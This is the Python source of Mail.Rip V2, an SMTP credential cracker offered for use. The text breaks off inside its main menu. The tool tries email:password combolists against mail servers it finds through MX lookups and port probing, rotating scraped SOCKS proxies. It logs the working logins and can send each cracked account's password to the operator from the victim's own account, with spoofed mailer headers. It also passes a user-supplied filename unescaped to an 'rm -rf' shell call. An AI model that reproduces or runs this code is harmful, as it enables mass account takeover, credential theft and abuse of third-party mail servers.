#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

'''
                              ### LEGAL NOTICES ###

           You are only allowed to use the following code for educational
            purposes! Mail.Rip v2.1337 shall not be used for any kind of
                illegal activity nor law enforcement at any time.
         This restriction applies to all cases of usage, no matter whether
              the code as a whole or only parts of it are being used.

                          ### END OF LEGAL NOTICES ###

        +-------------------------------------------------------------------+
        | PROJECT:      Mail.Rip V2.1337                                    |
        | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
        | RELEASE:      X (final version, 2021-03-27)                       |
        | AUTHORS:       DrPython3 @ GitHub.com & Nexus @ github.com        |
        +===================================================================+
        | Based on Mail.Rip V1, this is the new and improved version.       |
        | It is still a SMTP checker / SMTP cracker testing your mailpass   |
        | combolists for working SMTP accounts. Nevertheless, the code has  |
        | been cleaned, improved and commented.                             |
        | Mail.Rip V2 is faster and more reliable, still providing support  |
        | for SOCKS4 / SOCKS5 proxys and verifying working email delivery   |
        | for every valid SMTP login being found.                           |
        +-------------------------------------------------------------------+
        |                                                                   |
        |         SUPPORT THIS PROJECT: BUY ME A COFFEE OR DONATE!          |
        |                                                                   |
        |             BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5               |
        |             LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7               |
        |                                                                   |
        |         All donations are appreciated - coffee even more.         |
        |                                                                   |
        +-------------------------------------------------------------------+
'''

# [*** Python Modules ***]
# ########################
import sys
try:
    import os
    import smtplib
    import socket
    import ssl
    import threading
    import json
    import re
    import uuid
    import socks
    import requests
    import certifi
    import dns.resolver
    from tqdm import tqdm
    from time import sleep
    from email.message import EmailMessage
    from random import randint
    from queue import Queue
    from colorama import Fore, init
except Exception:
    sys.exit('[ERROR] Cannot import the needed Python modules!' + '\nCheck dependencies and start Mail.Rip v2 again.\n\n')

# initialize colorama:
init(autoreset=True)

# [*** Variables, Lists, Dictionaries ***]
# ########################################
locker = threading.Lock()
attack_queue = Queue()

default_timeout = float(3.0)
default_threads = int(9)
default_blacklist = True
attacker_mail = 'invalid@mail.sad'

use_socks = False
type_socks = 'SOCKS4'
amount_socks = int(0)
socksproxys = []

count_threads = int(0)
combos = []
targetsleft = int(0)
hits = int(0)
emailssent = int(0)
fails = int(0)

# lists, dictionaries from library.json:
try:
    with open('library.json') as included_imports:
        jsonobj = json.load(included_imports)
        smtpdomains = (jsonobj['smtpdomains'])
        smtpports = (jsonobj['smtpports'])
        commonports = (jsonobj['commonports'])
        hosterblacklist = (jsonobj['hosterblacklist'])
        socks4sources = (jsonobj['socks4sources'])
        socks5sources = (jsonobj['socks5sources'])
        emailcontent = (jsonobj['emailcontent'])
except Exception:
    sys.exit(Fore.RED + '\n\n[ERROR] File "library.json" not found! \nCheck the file and start Mail.Rip V2 again.\n\n')


# [*** Functions ***]
# ###################
def clean():
    '''
    Blank screen on purpose.

    :return: None
    '''

    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

    return None


def countdown(x: int):
    '''
    Simple countdown from "x".

    :param int x: countdown start
    :return: None
    '''

    i = int(x)
    while i > 0:
        if i < 3: print(Fore.RED + f'... {str(i)}')
        elif i < 4: print(Fore.YELLOW + f'... {str(i)}')
        else: print(Fore.GREEN + f'... {str(i)}')

        sleep(0.95)
        i -= 1

    return None


def writer(text: str, ftype: str):
    '''
    Saves any content to a TXT-file.

    :param str text: content to save
    :param str type: filename
    :return: True, False
    '''

    # create missing directory:
    try: 
        if not os.path.isdir('results'): 
            os.makedirs('results')
    except Exception: 
        sys.exit('[ERROR] Failed to create directory for results! \nCreate the folder yourself, and retry.\n\n')

    try:
        # set filename and path:
        file_name = str(f'{ftype}.txt')
        targetfile = os.path.join('results', file_name)

        # edit file:
        with open(str(targetfile), 'a+') as output_file:
            output_file.write(f'{text}\n')

        return True
    except Exception:
        return False


def emailverify(email):
    '''
    Verifies format of an email address.

    :param str email: email address
    :return: True, False
    '''

    email_regex = r'^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
    # verification:
    return re.search(email_regex, email)


def setdefaults():
    '''
    Set / change default values for attacks.

    :return: True, False
    '''

    global test_deliver
    global default_threads
    global default_timeout
    global default_blacklist
    global attacker_mail

    defaults_changed = int(0)
    clean()

    print(Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*44 + '\n')

    # enable/disable test email sending
    try:
        should_we = input(Fore.RESET + '\nSend test email? (yes / no)    ' + Fore.YELLOW).lower()
        test_deliver = True if should_we.startswith('y') else False
        defaults_changed += 1
    except:
        test_deliver = False
        print(Fore.RED + f'\nNo change, test email won\'t be sent.\n')

    # set amount of threads:
    try:
        default_threads = int(input(Fore.RESET + '\nEnter amount of threads to use:\n' + Fore.YELLOW))
        print(Fore.GREEN + f'\nThreads set to {str(default_threads)}.\n')
        defaults_changed += 1
    except Exception:
        default_threads = 9
        print(Fore.RED + f'\nNo change, Mail.Rip V2 will use {str(default_threads)} threads.\n')

    # set default timeout:
    try:
        default_timeout = float(input(Fore.RESET + '\nEnter value for timeout:\n' + Fore.YELLOW))
        print(Fore.GREEN + f'\nTimeout set to {str(default_timeout)}.\n')
        defaults_changed += 1
    except Exception:
        default_timeout = float(3.0)
        print(Fore.RED + f'\nNo change, timeout remains {str(default_timeout)}.\n')

    # de-/activate domain blacklist:
    try:
        blacklist = str(input(Fore.RESET + '\nUse blacklist for email domains:\n(yes / no)    ' + Fore.YELLOW)).lower()
        if blacklist.startswith('n'):
            default_blacklist = False
            print(Fore.RED + '\nBlacklist for email domains deactivated.\n')
            defaults_changed +=1
        else:
            default_blacklist = True
            print(Fore.GREEN + '\nBlacklist for email domains remains activated.\n')
    except Exception:
        pass

    if test_deliver:
        # set user e-mail address:
        try:
            new_mail = str(input('\nEnter YOUR email for delivery test:\n' + Fore.YELLOW))
            verified = emailverify(str(new_mail))

            if verified:
                attacker_mail = str(new_mail)
                print(Fore.GREEN + f'\nEmail for delivery test set to: {str(attacker_mail)}.\n')
                defaults_changed += 1
            else:
                attacker_mail = str('invalid@mail.sad')
                print(Fore.RED + '\nNo valid email set for delivery test.\n')

        except Exception:
            attacker_mail = str('invalid@mail.sad')
            print(Fore.RED + '\nNo valid email set for delivery test.\n')

    if defaults_changed > 0:
        return True
    else:
        return False


def proxychecker():
    '''
    Verifies scraped proxys are working.

    :return: None
    '''
    clean()
    valid_proxys = int(0)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.options &= ~ssl.OP_NO_SSLv2 # disables SSL v2
    context.options &= ~ssl.OP_NO_SSLv3 # disables SSL v3
    context.options &= ~ssl.OP_ALL # workarounds for bugs

    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    print(Fore.YELLOW + '\n\nChecking scraped proxys now ...\n')
    try:
        with open('proxys.txt', 'r+') as checked:
            # read scraped proxys:
            proxy_checks = checked.readlines()
            checked.seek(0)

            for proxy in tqdm(proxy_checks, desc='Checked'):
                try:
                    # get IP and port:
                    check_ip = str(str(proxy).split(':')[0])
                    check_port = int(str(proxy).split(':')[1])
                    # set prroxy:
                    if type_socks == 'SOCKS4':
                        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, check_ip, check_port)
                    else:
                        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, check_ip, check_port)

                    socks.socket.setdefaulttimeout(float(1.0))
                    socks.wrapmodule(smtplib)

                    # establish SMTP connection:
                    checker_connection = smtplib.SMTP_SSL(host=str('smtp.gmail.com'),
                                                          port=int(465),
                                                          timeout=float(2.0),
                                                          context=context)


                    # send cmd and verify by status code:
                    test = checker_connection.noop()
                    checker_connection.quit()

                    # if status code ok, save proxy:
                    if re.search('250', str(test)):
                        valid_proxys += 1
                        checked.write(proxy)

                    # else drop proxy from list:
                    else:
                        pass

                except Exception:
                    pass

            checked.truncate()

        if valid_proxys > 0: print(Fore.GREEN + f'\nWorking {type_socks}-proxys found: {str(valid_proxys)}')
        else: pass
    except Exception:
        print(Fore.RED + '[ERROR] Checking scraped proxys failed ...')

    return None


def proxysupport():
    '''
    De- / activate proxy-support including scraper and checker.

    :return: True, False
    '''
    global use_socks
    global type_socks
    global amount_socks
    global socksproxys

    ip_regex = r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]{1,5})'
    clean()

    # de- / activate proxy-support:
    print(Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE PROXY-SUPPORT:\n' + '-'*51 + '\n\n')
    new_use = str(input('Activate proxy-support?\n(yes / no)    ' + Fore.YELLOW))
    if new_use in ['y', 'ye', 'yes']:
        use_socks = True
    else:
        pass

    # if activated, set proxy-type:
    if use_socks:
        new_type = str(input(Fore.WHITE + '\n\nType of proxys to use?\n(SOCKS4 / SOCKS5)    ' + Fore.YELLOW)).lower()

        if new_type in ['5', 's5', 'sock5', 'socks5']:
            type_socks = 'SOCKS5'
            print(Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS5 proxys.')
        else:
            print(Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS4 proxys.')

    # if deactivated, end function:
    else: return False

    # get proxy sources:
    if type_socks == 'SOCKS4': sources = socks4sources
    else: sources = socks5sources

    # start scraping:
    print(Fore.YELLOW + f'\n\nScraping {type_socks}-proxys (...)')
    socket.setdefaulttimeout(default_timeout)

    s = requests.session()
    for source in sources:
        try:
            scraped = s.get(source, headers={'User-Agent': 'MailRip/2.1337 (https://github.com/DrPython3/MailRipV2)'})

            # saved to temporary txt-file:
            with open('scraped.txt', 'a') as output_file:
                output_file.write(str(scraped.text.decode('utf-8').rstrip()))
            print(Fore.GREEN + f'Scraped: {str(source)}')

        except Exception:
            print(Fore.RED + f'Scraping failed for: {str(source)}')
            continue

    # clean up scraped data:
    print(Fore.YELLOW + '\n\nRemoving unwanted text from results ...')
    try:

        with open('scraped.txt', 'r+') as scraped_data:
            valid_proxy = scraped_data.readlines()
            scraped_data.seek(0)

            for line in valid_proxy:
                # verify IP format:
                if re.search(ip_regex, line):
                    scraped_data.write(line)

            scraped_data.truncate()
        print(Fore.GREEN + 'Unwanted text removed successfully.')

    except Exception:
        print(Fore.RED + 'Removing unwanted text failed.')

    # remove duplicates:
    print(Fore.YELLOW + '\n\nRemoving duplicates from results ...')
    try:
        unique_proxys = set()
        with open('proxys.txt', 'w') as cleaned:
            for line in open('scraped.txt', 'r'):
                if line not in unique_proxys:
                    cleaned.write(line)
                    unique_proxys.add(line)
        print(Fore.GREEN + 'Duplicates successfully removed.')
    except Exception:
        print(Fore.RED + 'Removing duplicates failed.')

    try:
        skip_check = str(input(Fore.WHITE + '\n\nSkip proxy checker?\n(yes / no)    ' + Fore.YELLOW))
        if skip_check.lower() in ['y', 'ye', 'yes']:  pass
        else:
            proxychecker()
            print(Fore.GREEN + '\n\nScraped proxys have been checked!')
            sleep(3.0)

    except Exception:
        pass

    # load proxys into list:
    print(Fore.YELLOW + '\n\nLoading proxys into global list ...')
    try:
        socksproxys = open('proxys.txt', 'r').read().splitlines()
        amount_socks = int(len(socksproxys))
        print(Fore.GREEN + 'Proxys loaded into global list.')
        # delete temporary files:
        if os.name == 'nt':
            os.system('del proxys.txt')
            os.system('del scraped.txt')
        else:
            os.system('rm proxys.txt')
            os.system('rm scraped.txt')
        return True
    except Exception:
        print(Fore.RED + '[ERROR] Loading proxys failed!\nProxy-support is deactivated for your attacks.')
        use_socks = False
        return False


def getrandomproxy():
    '''
    Provides a randomly chosen proxy.

    :return: proxy-ip
    '''
    x = randint(0, int(amount_socks))
    proxy = str(socksproxys[int(x)])
    return proxy


def blacklistcheck(domain):
    '''
    Checks blacklist for given e-mail domain.

    :param str domain: e-mail domain
    :return: True, False
    '''
    try:
        x = int(hosterblacklist.count(str(domain)))
        if x == 0:
            return False
        else:
            return True
    except Exception:
        print(Fore.RED + f'Blacklist check failed for: {str(domain)} ...')
        return False


def mxlookup(worker_name, domain):
    '''
    Looks up SMTP host in MX records of e-mail domain.

    :param str worker_name: thread ID
    :param str domain: e-mail domain
    :return: found_host
    '''
    socket.setdefaulttimeout(float(default_timeout))
    domain_regex = r'^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
    found_host = str('no_host_found')

    # set up resolver:
    lookup = dns.resolver.Resolver(configure=False)

    # use Cloudflare's DNS servers:
    lookup.nameservers = ['1.1.1.1', '1.0.0.1']

    # start lookup:
    try:
        with locker:
            print(Fore.WHITE
                  + f'[{str(worker_name)}]: Looking up SMTP-host in MX records of {str(domain)}')

        raw_result = lookup.resolve(str(domain), 'MX')

        # get first result:
        mx_host = str(raw_result[0]).split(' ')[1].rstrip('.')
        if re.search(domain_regex, mx_host):
            # if format is verified, set found_host:
            found_host = str(mx_host)

        # else get second result:
        else:
            mx_host = str(raw_result[1]).split(' ')[1].rstrip('.')
            if re.search(domain_regex, mx_host):
                found_host = str(mx_host)
            else:
                with locker:
                    print(Fore.RED
                          + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
                return found_host

        # return found host, else "no_host_found":
        with locker:
            print(Fore.GREEN
                  + f'[{str(worker_name)}]: SMTP-host {str(found_host)} found in MX records of {str(domain)}')
        return found_host

    except Exception:
        with locker:
            print(Fore.RED + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
        return found_host


def unknownport(worker_name, smtphost):
    '''
    Looks for unknown port by trying most common ones.

    :param str worker_name: thread ID
    :param str smtphost: host with unknown port
    :return: found_port
    '''
    found_port = int(0)
    unkportssl = ssl.create_default_context()
    with locker:
        print(Fore.WHITE + f'[{str(worker_name)}]: Searching connection port of {str(smtphost)}')

    for port in commonports:
        # get port to test:
        test_port = int(port)
        try:
            # set up a random proxy if activated:
            if use_socks:
                proxy_ip, proxy_port = str(getrandomproxy()).split(':')

                if type_socks == 'SOCKS4': socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
                else: socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)

                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)

            # else, set default timeout:
            else:
                socket.setdefaulttimeout(float(default_timeout))

            # try connection:
            try:
                # try SSL-connection for port 465:
                if int(test_port) == 465: connection = smtplib.SMTP_SSL(smtphost, test_port, timeout=default_timeout, context=unkportssl)
                else:
                    # try standard connection for other ports:
                    connection = smtplib.SMTP(smtphost, test_port, timeout=default_timeout)

                connection.quit()
            except Exception:
                continue

            with locker:
                print(Fore.GREEN + f'[{str(worker_name)}]: successfully connected to {str(smtphost)}:{str(test_port)}')

            found_port = int(test_port)
            break
        except Exception:
            continue
    return found_port


def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
    '''
    Tries to send emails using found SMTP logins.

    :param str smtphost: SMTP address
    :param int smtpport: SMTP connection port
    :param str smtpuser: SMTP username
    :param str smtppass: SMTP password
    :param str smtpemail: SMTP email address
    :param str proxyip: SOCKS-proxy IP
    :param int proxyport: SOCKS-proxy port
    :return: True, False
    '''

    global emailssent
    emailssl = ssl.create_default_context()

    # set proxy if activated:
    if use_socks:
        if type_socks == 'SOCKS4':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
        else:
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)

        socks.socket.setdefaulttimeout(default_timeout)
        socks.wrapmodule(smtplib)

    else:
        socket.setdefaulttimeout(default_timeout)

    try:
        # get random email content:

        first_text = 'first' + str(randint(1, 5))
        second_text = 'second' + str(randint(1, 5))
        last_text = 'last' + str(randint(1, 5))
        first_line = str(emailcontent[first_text])
        second_line = str(emailcontent[second_text])
        last_line = str(emailcontent[last_text])

        # set up email letter:
        email_content = str(
            first_line + '\n'
            + second_line + '\n\n'
            + f'email address: {smtpemail}\n'
            + f'smtp host: {smtphost}:{str(smtpport)}\n'
            + f'smtp user: {smtpuser}\n'
            + f'smtp password: {smtppass}\n\n'
            + last_line + '\n'
        )
        # generate random ID:

        randomid = str(uuid.uuid4().hex)[0:6].upper()

        # generate email:
        letter = EmailMessage()
        letter.add_header('Subject', str(f'id {randomid} test result'))
        letter.add_header('From', str(f'MailRipV2 <{smtpemail}>'))
        letter.add_header('To', str(f'MailRip User <{attacker_mail}>'))
        letter.add_header('Reply-To', smtpemail)
        letter.add_header('MIME-Version', '1.0')
        letter.add_header('Content-Type', 'text/plain;charset=UTF-8')
        letter.add_header('X-Priority', '1')
        letter.add_header('X-MSmail-Priority', 'High')
        letter.add_header('X-Mailer', 'Microsoft Office Outlook, Build 17.551210')
        letter.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.3790.1830')
        letter.set_content(email_content)

    except Exception:
        return False

    try:
        # connect to SMTP and send email:
        if smtpport == 465: victim = smtplib.SMTP_SSL(smtphost, smtpport, timeout=float(60.0), context=emailssl)
        else:
            victim = smtplib.SMTP(smtphost, smtpport, timeout=float(60.0))
            try:
                victim.ehlo()
                victim.starttls(context=emailssl)
                victim.ehlo()
            except Exception:
                pass

        victim.login(smtpuser, smtppass)
        victim.send_message(letter, from_addr=smtpemail, to_addrs=[attacker_mail])
        victim.quit()
        # return True for sent emails:
        emailssent += 1

        return True

    except Exception:
        return False


def comboloader():
    '''
    Loads combos from file.

    :return: True, False
    '''

    global combos
    clean()

    print(Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*36 + '\n\n')

    # get filename of combosource:
    input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + Fore.YELLOW))
    if input_file == '': return False
    else:
        print(Fore.WHITE + f'\nReading and preparing combos from file: {input_file}')

    # read, prepare and load combos:
    try:

        # -- STEP 1 --
        # create temporary file for cleaned combos:
        with open('targets_temp.txt', 'w') as temp_file:
            for line in open(input_file, 'r'):

                # replace common separators with ":"
                line = str(line).replace(';', ':').replace('|', ':').replace(',', ':')

                # verify format of email address:
                verify_email = str(line.split(':')[0])
                result_verify = emailverify(verify_email)

                if not result_verify: continue
                else: pass

                # check blacklist for email domain:
                if default_blacklist:
                    blacklist_domain = str(verify_email.split('@')[1])
                    blacklist_result = blacklistcheck(blacklist_domain)

                    if blacklist_result:
                        print(Fore.RED + f'Blacklist Check: {blacklist_domain} [FAILED], ' + f'skipping target {verify_email}')
                        # if blacklisted, save to blacklisted-file:
                        writer(line.rstrip(), str('__blacklisted__'))
                        continue

                    else: pass

                else: pass

                # save cleaned combos:
                temp_file.write(line)
                
        # -- STEP 2 --
        # create object for caching:
        combos_cleaned = set()

        # create file for fully cleaned combos:
        with open('targets.txt', 'w') as output_file:
            for line in open(str('targets_temp.txt'), 'r'):

                # check whether combo us unique:
                if line not in combos_cleaned:
                    # if unique, save to file:
                    output_file.write(line)
                    combos_cleaned.add(line)
                    
                else: continue

        try: del combos_cleaned
        except Exception: pass

        # -- STEP 3 --
        # load combos into cache:
        combos = open('targets.txt', 'r').read().splitlines()

        # delete temporary and combofiles:
        save = input(Fore.RESET + '\nKeep combolist? (yes / no)    ' + Fore.YELLOW).lower()
        try:
            if save.startswith('n'): # remove combofile
                os.system(('del ' if os.name == 'nt' else 'rm -rf ') + input_file)
            os.system(('del ' if os.name == 'nt' else 'rm -rf ') + 'targets_temp.txt')
        except Exception:
            print(Fore.RED + '\nFailed to remove temporary files.\n')

        # return True for at least one combo loaded:
        if int(len(combos)) > 0: return True
        else:
            print(Fore.RED + '\nNo combos loaded.')
            return False
    except Exception: return False


def attacker(attackid, target):
    '''
    The full attack on each target.

    :param str attackid: thread ID
    :param str target: combo
    :return: True, False
    '''
    global hits
    # set attacker ID:
    attacker_id = str(f'ATTACKER-{str(attackid)}')
    attackerssl = ssl.create_default_context()
    try:
        # reset variables:
        target_email, target_host, target_port, target_user, target_pass = '', '', 0, '', ''
        proxy_host, proxy_port = 'none', 0
        next_combo = ''

        # set proxy if activated:
        if use_socks:
            proxy_host, proxy_port = str(getrandomproxy()).split(':')

            if type_socks.upper() == 'SOCKS4':
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_host, int(proxy_port))
            else:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port))

            socks.socket.setdefaulttimeout(default_timeout)
            socks.wrapmodule(smtplib)

        # else set default timeout:
        else:socket.setdefaulttimeout(default_timeout)

        # set next target:
        next_combo = str(target)

        # save to checked.txt:
        writer(next_combo, str('__checked__'))
        with locker:
            print(Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {next_combo}')

        # start checking:
        target_email = str(next_combo.split(':')[0])
        target_pass = str(next_combo.split(':')[1])
        target_user = str(target_email)

        # get target-host from hosterlist:
        target_domain = str(target_email.split('@')[1]).lower()
        try: target_host = str(smtpdomains[target_domain])
        except Exception:

            # on errors, lookup host in MX records:
            lookup_host = str(mxlookup(attacker_id, target_domain))

            # if lookup fails, end attack:
            if lookup_host == 'no_host_found':
                writer(str(next_combo), str('__invalid__'))
                return False

            # else set found target_host:
            else: target_host = str(lookup_host)

        # get targetport from hosterlist:
        try: target_port = int(smtpports[target_host])
        except Exception:

            # on errors search for port:
            find_port = int(unknownport(str(attacker_id), target_host))

            # if search for port fails, end attack:
            if find_port == 0:
                with locker:
                    print(Fore.RED + f'[{str(attacker_id)}]: No target-port found for {next_combo}')
                writer(next_combo, str('__invalid__'))
                return False

            # else set target_port:
            else: target_port = int(find_port)

        # attack target:
        # step#1 - establish connection:
        try:
            with locker:
                print(Fore.WHITE  + f'[{str(attacker_id)}]: Connecting to {target_host} for checking {next_combo}')
            # try SSL-connection for port 465:

            if int(target_port) == 465: attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=attackerssl)
            else:

                # try standard connection for other ports:
                attack = smtplib.SMTP(target_host, target_port, timeout=default_timeout)
                try:
                    # try to establish TLS:
                    attack.ehlo()
                    attack.starttls(context=attackerssl)
                    attack.ehlo()

                except Exception:
                    pass

        except Exception:
            # cancel attack if connection fails:
            with locker:
                print(Fore.RED + f'[{str(attacker_id)}]: Connection to {target_host} failed')
            writer(next_combo, str('__invalid__'))
            return False

        # step#2.1 - try login with e-mail:
        try:
            with locker:
                print(Fore.WHITE + f'[{str(attacker_id)}]: Testing login for combo {next_combo}')
            attack.login(target_user, target_pass)

        # step#2.2 - on errors try login with user from e-mail:
        except Exception:
            try:
                # set target_user = e-mail pseudo:
                target_user = str(target_email.split('@')[0])
                attack.login(target_user, target_pass)

            except Exception:
                try: attack.quit()
                except Exception: pass

                # end attack if login fails again:
                with locker:
                    print(Fore.RED + f'[{str(attacker_id)}]: No hit for combo {next_combo}')
                writer(next_combo, str('__invalid__'))
                return False

        # step#3 - save results:
        try: attack.quit() # close the connection:
        except Exception: pass

        with locker:
            print(Fore.GREEN + '\n' + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {next_combo}\n' + '#'*80 + '\n')

        # save hit to txt-file named like the SMTP-host:
        writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str(f'{str(target_host)}'))

        # save hit to txt-file "__valid__.txt":
        writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str('__valid__'))

        hits += 1

        # step#4 - for hits, call deliverytest function:
        if attacker_mail == 'invalid@mail.sad': pass
        else:
            if test_deliver:
                result_delivery = deliverytest(
                    str(target_host),
                    int(target_port),
                    str(target_user),
                    str(target_pass),
                    str(target_email),
                    str(proxy_host),
                    int(proxy_port))
                # for sent emails, save hit to sentemail.txt:

                if result_delivery:
                    with locker:
                        print(Fore.GREEN + f'[{str(attacker_id)}]: E-mail sent with {target_email}')
                    writer(
                        str(f'MAIL: {str(target_email)}, '
                            + f'HOST: {str(target_host)}, '
                            + f'PORT: {str(target_port)}, '
                            + f'USER: {str(target_user)}, '
                            + f'PASS: {str(target_pass)}'), 
                        str('__emailtest__'))
                else:
                    with locker:
                        print(Fore.RED + f'[{str(attacker_id)}]: E-mail test failed for {target_email}')
        return True
    except Exception:
        with locker:
            print(Fore.RED + f'[{str(attacker_id)}]: An error occurred while checking {next_combo}')
        
        writer(next_combo, str('__invalid__'))

        return False


def attack_threader():
    '''
    Function for attack threads.

    :return: None
    '''
    global targetsleft
    global fails

    attacker_id = str(count_threads)

    while 1:
        try:
            next_target = str(attack_queue.get())
            result = attacker(attacker_id, next_target)

            if not result: fails += 1
            else: pass

            targetsleft -= 1
            attack_queue.task_done()
        except Exception:
            break
    return None


def startattack():
    '''
    Starts attack threading, provides stats in window title.

    :return: None
    '''

    global count_threads
    global targetsleft
    global hits
    global fails

    clean()
    print(Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*40 + '\n')
    countdown(5)

    # set amount of targets:
    targetsleft = int(len(combos))

    # start threads:
    for _ in range(default_threads):
        count_threads += 1
        attack_thread = threading.Thread(target=attack_threader)
        attack_thread.daemon = True
        attack_thread.start()

    # fill queue:
    for target in combos:
        attack_queue.put(target)

    # show stats in title:
    while targetsleft > 0:
        try:
            sleep(0.5)
            wintitle = f'TO CHECK: {str(targetsleft)} # HITS: {str(hits)} # EMAILS: {str(emailssent)} # FAILS: {str(fails)}'
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except Exception:
            pass

    print(Fore.YELLOW + '\n' + '#'*44 + '\n# FINISHING ATTACK! BE PATIENT, PLEASE ... #\n' + '#'*44 + '\n')

    attack_queue.join()
    sleep(3.0)
    clean()

    input(Fore.YELLOW + '\n\nINFO\n' + '-'*4 + '\n'
          + f'Attack has been finished. Results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
          + 'Press [ENTER] to return to the main menu.')

    # reset stats:
    targetsleft = int(0)
    hits = int(0)
    fails = int(0)

    return None


# [*** LOGOS && ETC ***]
# ######################
legal_logo = '''
                           ##############################
                           #     I M P O R T A N T:     #
                           # L E G A L    N O T I C E S #
                           ##############################

           You are only allowed to use the following code for educational
           purposes! Mail.Rip v2 shall not be used for any kind of illegal
           activity nor law enforcement at any time.
           
           This restriction applies to all cases of usage, no matter whether
           the code as a whole or only parts of it are being used.

           The authors & collaborators are not responsible for any damage
           you do with this tool, it was created for educational purposes!

'''

main_logo = '''

            ################## DrPython3 @ GitHub.Com ##################
            #################### Nexus @ GitHub.Com ####################
            
             ███▄ ▄███▓ ▄▄▄       ██▓ ██▓          ██▀███   ██▓ ██▓███  
            ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒         ▓██ ▒ ██▒▓██▒▓██░  ██▒
            ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░         ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒
            ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒
            ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒ ██▓ ░██▓ ▒██▒░██░▒██▒ ░  ░
            ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░
            ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ▒ ░░▒ ░     
            ░      ░     ░   ▒    ▒ ░  ░ ░    ░     ░░   ░  ▒ ░░░       
                   ░         ░  ░ ░      ░  ░  ░     ░      ░           
                                               ░                        
            (donations):        btc = 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5
                                ltc = LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7
                                xmr = 4AkFxzDMmVMUFheuaohXrkGDUDPRCuKcJF7ajnXzSeipFHuPWbPiZTZTs5VDQux7fcgK5WV2vZwPY8qEqyV14nBUPwSxQkN
            ____________________________________________________________
            
                             -+==> [ MAIN MENU ] <==+-
            
            [0] EXIT MAIL.RIP V2          [3] DE-/ACTIVATE PROXY-SUPPORT
            [1] SET DEFAULT VALUES        [4] START ATTACK
            [2] LOAD COMBOS
            
            [MAILRIP]########################################[v2.1337|RX]

'''

# often used phrases:
p1 = '\nPress [ENTER] to return to main menu.'

# [*** MAIN ***]
# ##############
def mainmenu():
    '''
    The main menu.

    :return: None
    '''

    # clean screen, print logo:
    clean()
    print(Fore.RED + main_logo)

    try: option = input('Choose an option, please:    ' + Fore.YELLOW)
    except KeyboardInterrupt:
        clean()
        sys.exit(Fore.YELLOW + '\n\nClosing Mail.Rip v2 ...\nSee you again!')

    # option 0 / exit:
    if option == '0':
        clean()
        sys.exit(Fore.YELLOW + '\n\nClosing Mail.Rip v2 ...\nSee you again!')

    # option 1 / set defaults:
    elif option == '1':
        status_msg = setdefaults()
        if status_msg:
            input(Fore.GREEN + '\n\nSUCCESS\n' + '-'*7 + '\nDefault values changed.' + f'{p1}')
        else:
            input(Fore.RED + '\n\nERROR\n' + '-'*5 + '\nDefault values not changed.' + f'{p1}')
    
    # option 2 / load combos:
    elif option == '2':
        status_msg = comboloader()
        if status_msg:
            input(Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                  + f'\nCombos successfully loaded. Amount: {str(len(combos))}' + f'{p1}')
        else:
            input(Fore.RED + '\n\nERROR\n' + '-'*5 + '\nLoading combos failed.' + f'{p1}')

    # option 3 / proxy-support:
    elif option == '3':
        status_msg = proxysupport()
        if status_msg:
            input(Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
